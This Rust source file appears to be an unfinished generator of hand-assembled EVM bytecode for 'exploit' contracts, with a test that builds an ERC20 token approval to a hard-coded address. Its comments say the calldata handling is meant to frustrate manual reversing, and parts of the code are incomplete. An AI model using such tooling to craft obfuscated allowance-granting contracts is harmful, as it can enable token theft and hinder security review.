use std::{default, fmt::format};

use hex::{decode, encode};

fn main() {
    println!("Generating Exploit, anon-kun.\nPlease, be patient.");
    println!("Thanks for choosing ");
}

pub enum Cmds {
    ApproveErc20,
    TransferErc20,
    CustomCall,
}

#[derive(Default)]
struct Contract {
    offset_count: usize,
    calldata: String,
    calldata_offsets: Vec<usize>,
    source: String,
}
impl Contract {
    pub const P1_OP: &'static str = "60";
    pub const P20_OP: &'static str = "73";
    pub const GAS_OP: &'static str = "5A";
    pub const CALL_OP: &'static str = "F1";
    pub const POP_OP: &'static str = "50";
    pub const CD_LOAD_OP: &'static str = "35";
    pub const MSTORE_OP: &'static str = "52";
    pub const SHR_OP: &'static str = "1C";

    pub const APPROVE_SIG: &'static str = "63095ea7b35f52";

    pub fn default() -> Self {
        Self {
            offset_count: 0,
            calldata: String::new(),
            calldata_offsets: vec![],
            source: String::new(),
        }
    }

    pub fn build(cmds: Vec<Cmds>) -> Self {
        let mut contract = Self::default();

        contract
    }

    // returns old and new
    fn update_offset(&mut self, nibbles: usize) -> (usize, usize) {
        let old = self.offset_count;
        self.offset_count += nibbles;
        let new = self.offset_count;
        println!("\n[Offset] Updated from {} to {}", old, new);
        (old, new)
    }

    pub fn offset(&self) -> String {
        let hex = format!("{:02x}", self.offset_count);
        // println!("count : {}", self.offset_count);
        // println!("hex : {}\n", hex);
        hex
    }

    pub fn extend_calldata(&mut self, new_calldata: Vec<&str>) {
        println!("\n[Extending Calldata: {}]", new_calldata.len());
        println!("- [00] Old: {}", &self.calldata);

        for (i, item) in new_calldata.iter().enumerate() {

            self.calldata.extend([*item]);

            match self.calldata_offsets.len() == 0 {
                true => {
                    self.calldata_offsets.push(0);
                    self.calldata_offsets.push(self.calldata.len() / 2);
                }
                false => self.calldata_offsets.push(self.calldata.len() / 2),
            }


            // println!("self.calldata_offsets {:?}", &self.calldata_offsets);
            println!("- [{:02x}] New: {}", i + 1, &self.calldata);
        }
    }

    pub fn pad_cd_to_mem(&self, cd_from: usize, cd_to: usize) -> String {
        println!("\n[Unpack Calldata]");
        let mem_offset = 0;
        let mut seq = String::new();
        for (o, offset) in self.calldata_offsets[cd_from..cd_to].iter().enumerate() {

            // edit: realised i did this in the most complex way possible lmao
            let upper_bound = self.calldata_offsets[o + 1];
            let word =  self.calldata.split_at(*offset * 2).1.split_at((upper_bound - offset) * 2).0;
            let padded =  format!("{:0>64}", word);

            let shr_amt = 64 - word.len();

            println!("[SHR Word: 0x{:02x}]",shr_amt);
            println!("- [ ] word old: {}", word);
            println!("- [x] word new: {}", padded);

            let calldata_load = format!("{:02x}{}", offset, Self::CD_LOAD_OP);
            let shr = format!("{:02x}{}", shr_amt, Self::SHR_OP);
            let mstore = format!("{:02x}{}", mem_offset, Self::MSTORE_OP);
            let sub_seq = format!("{}{}{}", calldata_load, shr, mstore);

            println!("- [CD -> MEM: {}] {}\n", o, sub_seq);

            seq.extend([sub_seq]);
        }

        println!("[CD -> MEM: Sequence] {}", seq);
        seq
    }

    pub fn approve_token(&mut self, token: &str, to: &str, amount: &str, calldata_nibbles: u32) {

        // Each nibble = 1 character (pretty convenient right?!)
        let calldata_len: usize = (to.len() / 2) + (amount.len() / 2);
        let _ = self.update_offset(calldata_len);
        self.extend_calldata(vec![to, amount]);
        let cd_to_mem = self.pad_cd_to_mem(0, 2);
        
        let calldata_size: String = format!("{:02x}", calldata_nibbles);
        let ret: String = format!("{}00{}00", Self::P1_OP, Self::P1_OP);
        let arg: String = format!(
            "{}{}{}{}{}",
            Self::P1_OP,
            calldata_size,
            cd_to_mem, // we inject the calldata to memory here to make manual reversing cancer to do
            Self::P1_OP,
            self.offset()
        );
        let token: String = format!("{}{}", Self::P20_OP, token); // assuming isnt pass in as '0x...'
        let gas_call_pop: String = format!("{}{}{}", Self::GAS_OP, Self::CALL_OP, Self::POP_OP);

        let seq = format!("{}{}{}{}", ret, arg, token, gas_call_pop);

        println!(
            "\n[Generated] Token Approval -> For Token {}\n{}",
            token, seq
        );
    }
}

/*
cargo test test -- --nocapture
*/
#[cfg(test)]
mod test {
    use super::*;

    /*
    cargo test test::test_approve_token -- --nocapture
     */
    #[test]
    fn test_approve_token() {
        let mut contract = Contract::default();
        contract.offset();
        contract.approve_token(
            "C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
            "9FC3da866e7DF3a1c57adE1a97c9f00a70f010c8",
            "3635C9ADC5DEA00000",
            0,
        );
    }
}